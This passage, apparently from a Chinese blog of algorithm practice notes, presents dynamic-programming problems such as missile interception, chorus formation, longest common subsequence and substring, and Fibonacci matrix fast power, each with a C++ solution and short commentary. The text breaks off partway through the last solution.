<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LIS</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		d[i] = a[i];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">				d[i] = <span class="built_in">max</span>(d[i], d[j] + a[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="拦截导弹">拦截导弹</h3>
<h5 id="题目描述-43">题目描述</h5>
<p>某国为了防御敌国的导弹袭击，开发出一种导弹拦截系统。但是这种导弹拦截系统有一个缺陷：虽然它的第一发炮弹能够到达任意的高度，但是以后每一发炮弹都不能高于前一发的高度。某天，雷达捕捉到敌国的导弹来袭，并观测到导弹依次飞来的高度，请计算这套系统最多能拦截多少导弹。拦截来袭导弹时，必须按来袭导弹袭击的时间顺序，不允许先拦截后面的导弹，再拦截前面的导弹。</p>
<h5 id="输入输出格式-41">输入输出格式</h5>
<h6 id="输入描述-43">输入描述:</h6>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">每组输入有两行，</span><br><span class="line">第一行，输入雷达捕捉到的敌国导弹的数量k（k&lt;<span class="operator">=</span><span class="number">25</span>），</span><br><span class="line">第二行，输入k个正整数，表示k枚导弹的高度，按来袭导弹的袭击时间顺序给出，以空格分隔。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-43">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">每组输出只有一行，包含一个整数，表示最多能拦截多少枚导弹。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">30</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LIS</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		d[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;i; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j] &gt;= a[i])&#123;</span><br><span class="line">				d[i] = <span class="built_in">max</span>(d[i], d[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="合唱队形">合唱队形</h3>
<h5 id="题目描述-44">题目描述</h5>
<p>N位同学站成一排，音乐老师要请其中的(N-K)位同学出列，使得剩下的K位同学不交换位置就能排成合唱队形。
合唱队形是指这样的一种队形：设K位同学从左到右依次编号为1, 2, …,
K，他们的身高分别为T1, T2, …, TK， 则他们的身高满足T1 &lt; T2 &lt; …
&lt; Ti , Ti &gt; Ti+1 &gt; … &gt; TK (1 &lt;= i &lt;= K)。
你的任务是，已知所有N位同学的身高，计算最少需要几位同学出列，可以使得剩下的同学排成合唱队形。</p>
<h5 id="输入输出格式-42">输入输出格式</h5>
<h6 id="输入描述-44">输入描述:</h6>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">输入的第一行是一个整数N（<span class="number">2</span> &lt;<span class="operator">=</span> N &lt;<span class="operator">=</span> <span class="number">100</span>），表示同学的总数。</span><br><span class="line">第一行有n个整数，用空格分隔，第i个整数Ti（<span class="number">130</span> &lt;<span class="operator">=</span> Ti &lt;<span class="operator">=</span> <span class="number">230</span>）是第i位同学的身高（厘米）。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-44">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能包括多组测试数据，对于每组数据，</span><br><span class="line">输出包括一行，这一行只包含一个整数，就是最少需要几位同学出列。</span><br></pre></td></tr></table></figure>
<p>正着排一遍，再倒着排一遍，找最大的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d1[maxn];</span><br><span class="line"><span class="type">int</span> d2[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(d1, <span class="number">0</span>, <span class="built_in">sizeof</span>(d1));</span><br><span class="line">		<span class="built_in">memset</span>(d2, <span class="number">0</span>, <span class="built_in">sizeof</span>(d2));</span><br><span class="line">		<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			d1[i] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">					d1[i] = <span class="built_in">max</span>(d1[i], d1[j]+<span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = n; i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">			d2[i] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = n; j &gt; i; j--)&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">					d2[i] = <span class="built_in">max</span>(d2[i], d2[j]+<span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			<span class="type">int</span> tmp = d1[i] + d2[i];</span><br><span class="line">			ans = <span class="built_in">max</span>(ans, tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; n-ans+<span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="最长递减子序列">最长递减子序列</h3>
<h5 id="题目描述-45">题目描述</h5>
<p>输入数字n，和n个整数，输出该数字串中的最长递减序列</p>
<h5 id="输入输出格式-43">输入输出格式</h5>
<h6 id="输入描述-45">输入描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">见样例</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-45">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">见样例</span><br></pre></td></tr></table></figure>
<p>先得到最长递减子序列长度，并算每一个元素的上一个的序号；然后找到d[i =
ans的元素位置；再根据pre往前得到最长递减子序列</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"><span class="type">int</span> pre[maxn]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">		<span class="built_in">memset</span>(pre, <span class="number">0</span>, <span class="built_in">sizeof</span>(pre));</span><br><span class="line">		<span class="type">int</span> b[n] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt;a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			d[i] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[j] &gt; a[i])&#123;</span><br><span class="line">					<span class="type">int</span> tmp = d[j]+<span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span>(tmp &gt; d[i])&#123;</span><br><span class="line">						d[i] = tmp;</span><br><span class="line">						pre[i] = j;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ans = <span class="built_in">max</span>(ans, d[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"><span class="comment">//		cout &lt;&lt; ans &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		for(int i = 0; i &lt; n; i++)&#123;</span></span><br><span class="line"><span class="comment">//			printf(&quot;%d:%d\n&quot;, d[i], pre[i]);</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line">		<span class="type">int</span> t = n<span class="number">-1</span>, l;</span><br><span class="line">		<span class="keyword">while</span>(t)&#123;</span><br><span class="line">			<span class="keyword">if</span>(d[t] == ans)&#123;</span><br><span class="line">				l = t;</span><br><span class="line">			&#125;</span><br><span class="line">			t--;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		cout &lt;&lt; l &lt;&lt; endl;</span></span><br><span class="line">		t = ans<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span>(; l!=<span class="number">0</span>; l = pre[l])&#123;</span><br><span class="line">			b[t--] = a[l];</span><br><span class="line">		&#125;</span><br><span class="line">		b[t] = a[l];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ans; i++)&#123;</span><br><span class="line">			cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最长公共子序列">最长公共子序列</h2>
<p>状态转移方程：</p>
<p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702223636395.png" alt="image-20230702223636395"></p>
<h3 id="coincidence">Coincidence</h3>
<h5 id="题目描述-46">题目描述</h5>
<p>Find a longest common subsequence of two strings.</p>
<h5 id="输入输出格式-44">输入输出格式</h5>
<h6 id="输入描述-46">输入描述:</h6>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">First <span class="keyword">and</span> <span class="keyword">second</span> <span class="built_in">line</span> <span class="keyword">of</span> <span class="keyword">each</span> input <span class="keyword">case</span> contain <span class="literal">two</span> strings <span class="keyword">of</span> lowercase <span class="keyword">character</span> <span class="keyword">a</span>…z. There are no spaces <span class="keyword">before</span>, inside <span class="keyword">or</span> <span class="keyword">after</span> <span class="keyword">the</span> strings. Lengths <span class="keyword">of</span> strings <span class="built_in">do</span> <span class="keyword">not</span> exceed <span class="number">100.</span></span><br></pre></td></tr></table></figure>
<h6 id="输出描述-46">输出描述:</h6>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">For <span class="keyword">each</span> <span class="keyword">case</span>, output k – <span class="keyword">the</span> <span class="built_in">length</span> <span class="keyword">of</span> <span class="keyword">a</span> longest common subsequence <span class="keyword">in</span> <span class="literal">one</span> <span class="built_in">line</span>.</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="type">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">					d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					d[i][j] = <span class="built_in">max</span>(d[i<span class="number">-1</span>][j], d[i][j<span class="number">-1</span>]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cout &lt;&lt; d[la][lb] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="最长连续公共子序列">最长连续公共子序列</h3>
<h5 id="题目描述-47">题目描述</h5>
<p>Time Limit: 1000 ms Memory Limit: 256 mb</p>
<p>输入两个字符串s1,s2。输出最长连续公共子串长度和最长连续公共子串。</p>
<h5 id="输入输出格式-45">输入输出格式</h5>
<h6 id="输入描述-47">输入描述:</h6>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">多组数据输入。</span><br><span class="line">输入两个字符串<span class="built_in">s1</span>,<span class="built_in">s2</span>，长度不大于<span class="number">100</span>，以空格隔开。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-47">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输出最长连续公共子串长度和最长连续公共子串。</span><br></pre></td></tr></table></figure>
<p>这种情况的状态转移方程为：</p>
<p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702230322534.png" alt="image-20230702230322534"></p>
<p>然后每次得到最长公共子串获取其末尾的下标，再通过长度就可打印序列（注意要最后一个，所以有等号）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="type">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> res = <span class="number">0</span>, l, r;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">					d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span>(d[i][j] &gt;= res)&#123;</span><br><span class="line">						res = d[i][j];</span><br><span class="line">						l = i;</span><br><span class="line">						r = j;</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					d[i][j] = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = l - res; i &lt; l; i++)&#123;</span><br><span class="line">			cout &lt;&lt;a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="骑车路线">骑车路线</h3>
<h5 id="题目描述-48">题目描述</h5>
<p>Tomislav最近发现自己的身材完全走样了，她走楼梯都变得很累。一天早上她起来以后，她决定恢复姣好的身材。她最喜欢的运动是骑自行车，因此她决定在本地的小山上做一次旅行。</p>
<p>她骑自行车的路线可以描述为N个数字的数列，每个数字表示每一段路地海拔高度。Tomislav最感兴趣的是最长的高度一直上升的子序列，她称这一段路为爬坡，Tomislav只想考虑这段爬坡的高度差（即开始和最后的数字的差距），而不是什么路程长度。</p>
<p>一段爬坡路被定义为至少两个连续的上升数列。例如，我们考虑如下路线数列12
3 5 7 10 6 1 11，这里有两个爬坡，第一个爬坡（3 5 7
10）的高度差是7，第二个爬坡的高度差是10（1 11）。</p>
<p>帮助Tomislav计算高度差最大的爬坡的高度差。</p>
<h5 id="输入输出格式-46">输入输出格式</h5>
<h6 id="输入描述-48">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">多组测试数据输入。</span><br><span class="line">第一行是一个正整数<span class="built_in">N</span> (<span class="number">1</span>&lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>), 描述了路线数列。</span><br><span class="line">第二行有<span class="built_in">N</span>个正整数，每个正整数<span class="built_in">Pi</span> (<span class="number">1</span>&lt;= <span class="built_in">Pi</span> &lt;= <span class="number">1000</span>)表示相应路段的海拔高度。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-48">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">所有爬坡中的最大高度差，如果路线数列里面没有爬坡，就输出0。</span><br></pre></td></tr></table></figure>
<p>我想的是用d[i]来定义到i为止最大的高度差，但过不了所有用例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;n; i++)&#123;</span><br><span class="line">			d[i] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="comment">//				cout &lt;&lt; d[j] &lt;&lt; &quot;vs&quot; &lt;&lt; a[i] - a[j] &lt;&lt; endl;</span></span><br><span class="line">				<span class="keyword">if</span>(d[i] &lt; d[j] || d[i] &lt; (a[i] - a[j])) d[i] = <span class="built_in">max</span>(d[j], a[i] - a[j]);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			res = <span class="built_in">max</span>(res, d[i]);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		for(int i = 0; i &lt;n; i++)&#123;</span></span><br><span class="line"><span class="comment">//				cout &lt;&lt; d[i] &lt;&lt; &quot; &quot;;		</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; endl;</span></span><br><span class="line">		cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc">misc</h1>
<h3 id="骨牌---加强版">骨牌 - 加强版</h3>
<h5 id="题目描述-49">题目描述</h5>
<p>有2<em>n 的地板，用1</em>2和 2*1
的骨牌进行铺地板。问共有多少种情况。</p>
<p>结果对 999983 取余，<strong>1&lt;=n&lt;=1e12。</strong></p>
<h5 id="输入输出格式-47">输入输出格式</h5>
<h6 id="输入描述-49">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入一个整数<span class="built_in">n</span></span><br></pre></td></tr></table></figure>
<h6 id="输出描述-49">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输出一个整数，表示有多少种情况</span><br></pre></td></tr></table></figure>
<p>其实就是斐波那契数列的矩阵快速幂</p>
<p><span class="math display">\[
[f(n-1), f(n-2)]*\begin{bmatrix}1 &amp; 1\\1&amp;0 \end{bmatrix} =
[f(n), f(n-1)]\\
所以\begin{bmatrix}f(1) &amp; f(2)\\0&amp;0 \end{bmatrix} *
(\begin{bmatrix}1 &amp; 0\\1&amp;1 \end{bmatrix})^n =
\begin{bmatrix}f(n+2) &amp; f(n+1)\\0&amp;0 \end{bmatrix}
\]</span></p>
<p>无优化的递归是2^n，记忆化处理是n，但由于数据量是1e12，递归过深会爆栈</p>
<p>改成递推是O(n)，也处理不了，变成矩阵乘法是O(8n)</p>
<p>再加上快速幂就是O(8logn)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> ll mod = <span class="number">999983</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">matrix</span>&#123;</span><br><span class="line">	ll m[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function">matrix <span class="title">multi</span><span class="params">(<span class="keyword">struct</span> matrix a, <span class="keyword">struct</span> matrix b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">matrix</span> tmp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)&#123;</span><br><span class="line">			tmp.m[i][j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2</span>; k++)&#123;</span><br><span class="line">				tmp.m[i][j] = (tmp.m[i][j] + a.m[i][k] * b.m[k][j]) % mod;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fastpower</span><span class="params">(ll n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">matrix</span> base, ans;</span><br><span class="line">    base.m[<span class="number">0</span>][<span class="number">0</span>] = base.m[<span class="number">0</span>][<span class="number">1</span>] = base.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    base.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">0</span>] = ans.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;  </span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">1</span>] = ans.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            ans = <span class="built_in">multi</span>(ans, base);</span><br><span class="line">    